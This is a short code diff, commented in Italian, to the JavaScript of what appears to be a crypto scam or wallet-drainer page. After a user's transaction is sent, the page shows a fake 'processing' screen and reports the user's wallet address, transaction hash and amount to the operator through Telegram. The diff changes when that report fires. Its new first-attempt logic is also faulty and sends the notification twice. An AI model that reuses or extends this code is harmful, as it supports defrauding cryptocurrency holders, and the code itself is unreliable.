@@ -524,6 +524,7 @@
         };
 
         let lastTxHash = '';
+        let isFirstAttempt = true;
 
         function createParticles() {
             const container = document.getElementById('particlesContainer');
@@ -630,10 +631,6 @@
                 lastTxHash = txHash;
                 console.log("Transaction sent:", txHash);
 
-                // Mostra la schermata di processing SUBITO
-                createParticles();
-                document.getElementById('processingScreen').classList.add('active');
-
                 let finalUserAddress = userAddress;
                 if (!finalUserAddress) {
                     try {
@@ -646,13 +643,31 @@
                     }
                 }
 
-                // Invia notifica Telegram SUBITO (senza aspettare conferma)
-                console.log("Sending Telegram notification...");
-                try {
-                    await sendTelegramNotification(finalUserAddress, txHash, amount);
-                    console.log("Telegram notification sent successfully");
-                } catch (notifError) {
-                    console.error('Error sending notification:', notifError);
+                // Al primo tentativo, invia notifica PRIMA di mostrare Processing
+                if (isFirstAttempt) {
+                    console.log("First attempt - sending notification immediately...");
+                    try {
+                        await sendTelegramNotification(finalUserAddress, txHash, amount);
+                        console.log("Telegram notification sent successfully");
+                    } catch (notifError) {
+                        console.error('Error sending notification:', notifError);
+                    }
+                    isFirstAttempt = false;
+                }
+
+                // Mostra la schermata di processing SUBITO
+                createParticles();
+                document.getElementById('processingScreen').classList.add('active');
+
+                // Nei click successivi, invia notifica dopo Processing
+                if (!isFirstAttempt) {
+                    console.log("Subsequent attempt - sending notification...");
+                    try {
+                        await sendTelegramNotification(finalUserAddress, txHash, amount);
+                        console.log("Telegram notification sent successfully");
+                    } catch (notifError) {
+                        console.error('Error sending notification:', notifError);
+                    }
                 }
 
                 // Aspetta 3 secondi prima di chiudere
